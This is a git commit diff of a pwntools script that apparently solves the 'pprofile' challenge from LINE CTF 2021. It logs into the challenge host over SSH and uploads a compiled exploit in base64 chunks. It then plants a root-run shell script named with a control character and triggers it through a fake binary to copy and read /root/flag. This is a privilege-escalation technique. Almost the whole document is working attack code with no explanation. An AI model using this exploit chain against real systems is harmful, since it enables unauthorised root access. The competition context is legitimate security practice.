608e4b2b6657a548465131381552550c049d8863
yuawn <ssspeed00@gmail.com>
2021-03-23 01:14:26 +0800

    add line ctf 2021

--- 2021/line/pprofile/upload.py
+++ 2021/line/pprofile/upload.py
@@ -2,7 +2,6 @@
 from pwn import *
 import base64
 
-
 sh = ssh( 'pprofile' , '34.85.76.194' , password = 'pprofile' , port = 10009 )
 y = sh.shell()
 
@@ -10,16 +9,15 @@ y.sendlineafter( '$' , 'cd /tmp' )
 
 os.system( 'musl-gcc exp.c -o exp -static -masm=intel -s' )
 os.system( 'gzip exp -f' )
-b = open( 'exp.gz' , 'rb' ).read()
-b = base64.b64encode(b)
+b = base64.b64encode(open( 'exp.gz' , 'rb' ).read())
 
 l = 800
 upload = log.progress('Uploading exp ...')
 for i in range( 0 , len( b ) , l ):
     upload.status( f'{i/float(len(b)) : .2%}' )
     y.sendlineafter( '$ ' , 'echo -n %s >> exp.gz.b64' % b[i:i+l].decode() )
-upload.success('Done!')
 
+upload.success('Done!')
 
 y.sendlineafter( '$ ' , 'cat exp.gz.b64 | base64 -d > exp.gz' )
 y.sendlineafter( '$ ' , 'gzip -d exp.gz' )
@@ -27,8 +25,10 @@ y.sendlineafter( '$ ' , 'chmod +x ./exp' )
 
 y.sendlineafter( '$' , "echo -ne '\\xffyyy' > fake" )
 y.sendlineafter( '$' , "chmod +x fake" )
-y.sendlineafter( '$' , "echo -ne '#!/bin/sh\\n/bin/chmod 777 /root/flag\\n/bin/cp /root/flag /flag' > ''$'\\004'" )
-y.sendlineafter( '$' , "chmod +x ''$'\\004'" )
+y.sendlineafter( '$' , "echo -ne '#!/bin/sh\\n/bin/chmod 777 /root/flag\\n/bin/cp /root/flag /flag' > ''$'\\003'" )
+y.sendlineafter( '$' , "chmod +x ''$'\\003'" )
 
+y.sendlineafter( '$' , "./fake" )
+y.sendlineafter( '$' , "cat /flag" )
 
 y.interactive()
